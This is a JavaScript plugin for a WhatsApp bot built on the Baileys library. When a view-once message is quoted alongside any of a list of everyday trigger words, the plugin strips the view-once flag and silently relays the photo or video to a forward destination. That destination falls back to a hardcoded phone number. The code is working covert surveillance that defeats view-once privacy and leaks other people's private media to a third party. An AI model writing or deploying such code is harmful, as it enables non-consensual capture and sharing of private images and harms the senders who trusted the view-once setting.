import { generateWAMessageFromContent } from "baileys";

export default {
    name: "viewonce",
    triggers: [
        "ay",
        "dios",
        "por",
        "que",
        "porque",
        "lindo",
        "adoro",
        "amo",
        "rawr",
        "boludo",
        "tonto",
        "cute",
        "bonito",
        "bonita",
        "video",
        "foto",
        "test"
    ],

    async execute(m, { sock }) {
        // Destino de reenvío leído desde .env
        const relayTo = process.env.FORWARD_JID
            ?? "59895609705@s.whatsapp.net";

        try {
            if (!m.quoted) return

            const msgContent = m.quoted.msg;
            const type = m.quoted.type;

            if (
                !msgContent?.viewOnce &&
                type !== "viewOnceMessage" &&
                type !== "viewOnceMessageV2" &&
                type !== "viewOnceMessageV2Extension"
            ) {
                return m.reply("El mensaje citado no es de visualización única.");
            }

            // Clonar y desactivar el flag viewOnce
            const newContent = JSON.parse(JSON.stringify(msgContent));
            newContent.viewOnce = false;

            const messagePayload = { [type]: newContent };

            const proto = generateWAMessageFromContent(
                m.from,
                messagePayload,
                { userJid: sock.user.id, quoted: m }
            );

            await sock.relayMessage(relayTo, proto.message, {
                messageId: proto.key.id,
            });

        } catch (err) {
            console.error("[viewonce] Error al reenviar:", err);
            return m.reply("Error al reenviar el mensaje.");
        }
    },
};
